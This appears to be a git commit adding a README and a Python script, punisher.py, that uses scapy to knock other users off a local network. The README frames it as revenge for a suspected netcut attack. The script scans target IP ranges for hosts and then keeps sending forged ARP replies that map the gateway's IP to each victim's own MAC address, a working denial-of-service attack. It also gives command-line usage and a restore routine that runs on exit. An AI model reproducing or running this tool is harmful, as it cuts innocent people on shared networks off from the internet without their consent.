6b5123037a16a527c6e1675e26f00ee3bb4a35e0
snowyukischnee <snowyukischnee@gmail.com>
2019-07-28 04:46:39 +0700

    first and last commit?

--- README.md
+++ README.md
@@ -1,1 +1,14 @@
 # cut-off-their-nets
+    Today, while I'm playing some `Insurgency: Sandstorm`, my ping was nice 50-60 average, however sometime it will spike up to 1000 and I couldn't move. I've tried another match but the result has gone worse: 'the game is unplayable', I've been kicked out due to the disconnection. I stopped play games and do some homeworks but this time I can not do anything about the internet, even `Google` was inaccessible. I thinked someone have been using `netcut` or some similar software. I gone and reset the router, I was quickly peek at the MAC address of this router. Then I created a static ARP mapping and problem was solved. However, I was still mad, I've decided to write this extreme small tiny script to excommunicado them.
+
+## Quickstarts
+Not much, just install `python 3.6+` and `scapy` then everything is done
+## Usage
+Just add some IP addres into the `*.txt` files and run this command:
+```sh
+python punisher.py -g gateways.txt -t targets.txt -e excludes.txt -i 2
+```
+For more information, please run:
+```sh
+python punisher.py --help
+```
---
+++ punisher.py
@@ -0,0 +1,136 @@
+import scapy.all as scapy
+import argparse
+import multiprocessing
+import threading
+import time
+
+
+CLIENTS = {}
+SENT_PACKETS = 0
+SEMAPHORE = 1
+DOWN = threading.Event()
+
+
+def scan(ip):
+    arp_request = scapy.Ether(dst='ff:ff:ff:ff:ff:ff') / scapy.ARP(op='who-has', pdst=ip)
+    ans, unans = scapy.srp(arp_request, timeout=3, verbose=False)
+    clients = {x[1].psrc: {'ip': x[1].psrc, 'mac': x[1].hwsrc,} for x in ans}
+    return clients
+
+
+def get_own_ips():
+    return [x[4] for x in scapy.conf.route.routes if x[2] != '0.0.0.0']
+
+
+def get_mac(ip):
+    return list(scan(ip).values())[0]['mac']
+
+
+def update_clients(args):
+    try:
+        global CLIENTS, SEMAPHORE
+        while True:
+            while SEMAPHORE == 0 and DOWN.is_set() == False:
+                time.sleep(1)
+            if DOWN.is_set():
+                break
+            SEMAPHORE -= 1
+            clients = {}
+            for target in args.target:
+                clients.update(scan(target))
+            exclude_ips = get_own_ips()
+            exclude_ips = exclude_ips + args.gateway + args.exclude
+            for ip in exclude_ips:
+                if ip in clients:
+                    del clients[ip]
+            CLIENTS = clients
+            SEMAPHORE += 1
+            DOWN.wait(5 * args.interval)
+    except Exception as e:
+        print(e)
+        DOWN.set()
+
+def sucker_punch(args):
+    try:
+        global SEMAPHORE, SENT_PACKETS
+        while True:
+            while SEMAPHORE == 0 and DOWN.is_set() == False:
+                time.sleep(1)
+            if DOWN.is_set():
+                break
+            SEMAPHORE -= 1
+            for client in CLIENTS:
+                if DOWN.is_set():
+                    SEMAPHORE += 1
+                    break
+                for i in range(len(args.gateway)):
+                    packet = scapy.ARP(op='is-at', psrc=args.gateway[i], hwsrc=CLIENTS[client]['mac'], pdst=CLIENTS[client]['ip'], hwdst=CLIENTS[client]['mac'])
+                    scapy.send(packet, verbose=False)
+                    SENT_PACKETS += 1
+                    print('\r[+] Packets sent: {}'.format(SENT_PACKETS), end='')
+            SEMAPHORE += 1
+            DOWN.wait(args.interval)
+    except Exception as e:
+        print(e)
+        DOWN.set()
+
+
+def run_away(args):
+    gateway_macs = [get_mac(gateway) for gateway in args.gateway]
+    for client in CLIENTS:
+        [
+            scapy.send(
+                scapy.ARP(op='is-at', psrc=args.gateway[i], hwsrc=gateway_macs[i], pdst=CLIENTS[client]['ip'], hwdst=CLIENTS[client]['mac']), 
+                verbose=False, count=5, inter=0.2
+            )
+            for i in range(len(gateway_macs))
+        ]
+
+
+def disarm():
+    while True:
+        if DOWN.is_set():
+            break
+        if input() == 'quit':
+            DOWN.set()
+            break
+
+
+def read_file(file):
+    ret = []
+    try:
+        with open(file, 'r') as f:
+            ret = [line.rstrip('\n') for line in f]
+    except:
+        pass
+    return ret
+
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser()
+    parser.add_argument('-g', '--gateway', default=None, help='path to file contains gateway IP')
+    parser.add_argument('-t', '--target', default=None, help='path to file contains target IP')
+    parser.add_argument('-e', '--exclude', default=None, help='path to file contains IP to be excluded')
+    parser.add_argument('-i', '--interval',  default=10, type=float, help='time interval to send ARP packets')
+    args = parser.parse_args()
+    assert(args.gateway is not None and args.target is not None)
+    try:
+        t_start = time.time()
+        args.gateway = read_file(args.gateway)
+        args.target = read_file(args.target)
+        args.exclude = read_file(args.exclude)
+        t0 = threading.Thread(target=disarm, args=())
+        t1 = threading.Thread(target=update_clients, args=(args,))
+        t2 = threading.Thread(target=sucker_punch, args=(args,))
+        t0.start()
+        t1.start()
+        t2.start()
+    except Exception as e:
+        print(e)
+    finally:
+        t0.join()
+        t1.join()
+        t2.join()
+        run_away(args)
+        t_finish = time.time()
+        print('Time elapsed: {}'.format(t_finish - t_start))
